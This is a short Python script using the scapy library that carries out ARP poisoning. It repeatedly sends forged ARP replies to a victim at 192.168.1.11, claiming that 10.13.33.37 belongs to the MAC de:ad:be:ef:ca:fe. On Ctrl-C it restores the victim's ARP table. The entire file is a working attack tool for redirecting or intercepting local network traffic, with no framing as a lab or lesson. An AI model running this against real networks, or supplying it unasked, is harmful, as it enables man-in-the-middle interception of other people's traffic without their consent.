import scapy.all as scapy

def restore_defaults(dest, source):
    # getting the real MACs
    target_mac = get_mac(dest)  # MAC of the target (victim or router)
    source_mac = get_mac(source)  # MAC of the spoofed source (router or victim)
    # creating the packet to restore ARP table
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, verbose=False)

def get_mac(ip):
    # request that contains the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concatenating ARP request and broadcast
    final_packet = broadcast / request
    # sending packet and capturing response
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # getting the MAC from the response
    mac = answer[0][1].hwsrc
    return mac

# function to perform ARP poisoning (spoofing)
def spoofing(target, spoofed_ip, spoofed_mac):
    # creating the ARP poisoning packet with the spoofed IP and MAC
    packet = scapy.ARP(op=2, pdst=target, hwdst="08:00:27:72:6b:4a", psrc=spoofed_ip, hwsrc=spoofed_mac)
    # sending the packet
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            # Send spoofed packet to victim (192.168.1.11)
            spoofing("192.168.1.11", "10.13.33.37", "de:ad:be:ef:ca:fe")
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        # Restoring the ARP table of the victim
        restore_defaults("192.168.1.11", "10.13.33.37")
        exit(0)

if __name__ == "__main__":
    main()
